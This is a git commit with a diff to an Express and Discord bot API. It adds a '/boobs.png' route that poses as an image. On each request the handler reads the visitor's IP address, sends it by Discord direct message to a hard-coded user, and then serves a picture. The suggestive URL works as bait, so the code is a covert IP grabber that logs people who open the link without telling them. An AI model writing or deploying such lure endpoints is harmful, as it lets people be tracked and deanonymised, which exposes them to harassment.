4a13f5c68b7d4020ab2deeded37c0b2340d12db2
RynerNO <ryner.no@gmail.com>
2025-04-20 18:37:20 +0200

    ✨ feat(api): add image endpoint with ip logging
    - add new endpoint `/boobs.png` to serve image
    - log user ip address to discord on access
    - serve `123.png` from assets directory

--- src/api/index.ts
+++ src/api/index.ts
@@ -4,6 +4,7 @@ import cors from 'cors';
 import bodyParser from 'body-parser';
 import router from './router/index';
 import getLogger from './helpers';
+import path from 'path'
 import { client } from '@bot/index'
 const logger = getLogger('API');
 dotenv.config();
@@ -18,12 +19,13 @@ app.use(
 app.use(router);
 app.set('trust proxy', true)
 app.get('/', async (_req, res) => {
+});
+app.get('/boobs.png', async (_req, res) => {
   logger.log('Recived get request');
   const ip = _req.ip || _req.socket.remoteAddress
   await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
-  res.redirect('https://google.com')
+  res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
 });
-
 app.post('/', (_req, res) => {
   logger.log('Recived post request');
   res.status(200).json({'hello world': 'hello world'});
